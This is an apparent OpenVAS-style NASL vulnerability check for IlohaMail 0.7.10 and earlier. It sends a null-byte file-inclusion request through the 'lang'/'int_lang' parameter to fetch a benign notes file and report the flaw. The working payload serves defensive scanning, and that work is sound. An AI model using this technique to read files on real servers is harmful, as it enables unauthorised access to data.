# SPDX-FileCopyrightText: 2004-2005 George A. Theall
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:ilohamail:ilohamail";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14630");
  script_version("2023-10-06T05:06:29+0000");
  script_tag(name:"last_modification", value:"2023-10-06 05:06:29 +0000 (Fri, 06 Oct 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_xref(name:"OSVDB", value:"7400");
  script_name("IlohaMail Arbitrary File Access via Language Variable");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2004-2005 George A. Theall");
  script_family("Remote file access");
  script_dependencies("ilohamail_detect.nasl");
  script_mandatory_keys("ilohamail/detected");

  script_tag(name:"solution", value:"Upgrade to IlohaMail version 0.7.11 or later.");

  script_tag(name:"summary", value:"The target is running at least one instance of IlohaMail version
  0.7.10 or earlier. Such versions contain a flaw in the processing of the language variable that
  allows an unauthenticated attacker to retrieve arbitrary files available to the web user.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir  = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
if( dir == "/" ) dir = "";

# Specify the file to grab from target, relative to IlohaMail/lang directory.
# ./notes.txt exists in each version I've seen. If you change it to
# something else, you will also need to change the pattern checked
# against the variable 'contents' below.
file = "./notes.txt";

# nb: the hole exists because conf/defaults.inc et al. trust
#     the language setting when calling include() to read
#     language settings ('int_lang' in more recent versions,
#     'lang' in older ones).
foreach var( make_list( "int_lang", "lang" ) ) {

  url = dir + "/index.php?" + var + "=" + file + "%00";
  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv( port:port, data:req );
  if( isnull( res ) ) continue;

  # nb: if successful, file contents will appear between the closing
  #     HEAD tag and the opening BODY tag, although note that later
  #     versions put a session key there.
  contents = strstr( res, "</HEAD>" );
  if( ! isnull( contents ) ) {
    contents = contents - strstr( contents, "<BODY>" );
    # nb: make sure the pattern match agrees with the file retrieved.
    if( contents =~ "New strings" ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
